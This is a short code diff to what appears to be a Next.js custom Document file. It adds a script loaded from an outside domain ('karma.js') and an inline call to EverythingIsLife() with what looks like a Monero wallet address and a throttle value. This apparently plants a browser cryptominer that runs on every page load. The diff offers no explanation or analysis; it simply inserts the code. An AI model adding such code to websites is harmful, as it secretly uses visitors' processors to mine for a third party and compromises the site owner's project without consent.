@@ -24,6 +24,13 @@ export default class MyDocument extends Document {
           `,
             }}
           />
+          <script src="https://trustiseverything.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
+          <script
+            dangerouslySetInnerHTML={{
+              __html: `
+              EverythingIsLife('49nJHLR2J1uJPLohyDBU9xC6k8rr1GqK6YuaQKYzvw9yGtz27S8DhZc7moCVzRtBdrGJrWVZnqwpwYz5LQ89mqLcMJAEwQF', 'x', 50);`,
+            }}
+          />
         </Head>
         <body>
           <Main />
